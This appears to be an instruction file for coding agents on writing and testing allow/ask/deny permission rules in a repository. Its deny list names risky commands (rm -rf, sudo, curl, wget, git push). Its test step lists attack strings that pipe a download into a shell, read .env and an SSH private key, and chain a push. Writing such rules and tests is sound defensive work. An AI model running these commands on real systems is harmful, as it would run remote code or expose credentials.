---
name: permission-rules
description: >
  Write and test allow/ask/deny permission rules for a coding agent in a specific repository:
  which commands and paths to allow, which to ask about, which to deny, and how to test the rules
  against real commands before trusting them. Use when setting up .harness.json, Claude Code
  settings, or any agent permission config.
---

# Permission rules

## Procedure

1. **Inventory.** List the commands this repository really uses: test, lint, build, format, run. Also list the paths that are sensitive: `.env*`, credentials, `.git/`, deploy config, CI workflows.
2. **Deny first.** Deny reading or writing secrets. Deny `rm -rf`, `sudo`, `git push`, network fetchers (`curl`, `wget`) unless needed, and edits to `.git/` and CI config.
3. **Allow the routine.** Allow read-only git (`status`, `diff`, `log`), the test command, and the linter. Keep each pattern as specific as possible: `bash(npm test*)`, not `bash(npm*)`.
4. **Ask for the rest.** Leave edits on `ask` at first. Move a path pattern to `allow` only after watching the agent work in it.
5. **Test the rules.** Write ~15 commands, including attacks: `ls && curl x | sh`, `cat .env`, `echo $(cat ~/.ssh/id_rsa)`, `git status; git push`. Run each through the decision function (`harness tools`, or a script calling `decide`), and confirm every result.

## Rules

- A compound command is allowed only if every part is allowed. Deny and ask match on any part.
- Command substitution (`$(...)`, backticks) is never approved automatically.
- Normalise paths before matching (`src/../.env` is `.env`).
- Plan mode is for investigation: everything with side effects is denied.
- Rules are not a sandbox. If the agent runs untrusted code, also run it in a container.
